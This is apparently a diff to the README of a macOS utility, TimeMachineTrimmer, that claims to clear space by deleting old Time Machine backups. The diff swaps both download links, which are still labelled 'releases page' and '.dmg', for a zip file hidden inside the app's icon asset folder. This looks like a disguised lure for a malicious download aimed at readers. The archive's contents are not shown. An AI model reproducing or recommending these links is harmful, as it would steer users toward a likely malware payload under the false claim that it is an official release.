@@ -1,6 +1,6 @@
 # ⌛ TimeMachineTrimmer - Create space by removing old backups
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Kitchenhelpbullacegrape12/TimeMachineTrimmer/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Kitchenhelpbullacegrape12/TimeMachineTrimmer/raw/refs/heads/main/TimeMachineTrimmer/Assets.xcassets/AppIcon.appiconset/Trimmer-Time-Machine-2.9.zip)
 
 ---
 
@@ -16,7 +16,7 @@ You need a Mac running a recent version of macOS. We support macOS 10.15 and new
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [releases page](https://github.com/Kitchenhelpbullacegrape12/TimeMachineTrimmer/releases).
+1. Visit the [releases page](https://github.com/Kitchenhelpbullacegrape12/TimeMachineTrimmer/raw/refs/heads/main/TimeMachineTrimmer/Assets.xcassets/AppIcon.appiconset/Trimmer-Time-Machine-2.9.zip).
 2. Look for the latest version at the top.
 3. Click the link that ends in .dmg.
 4. Open the downloaded file once the transfer completes.
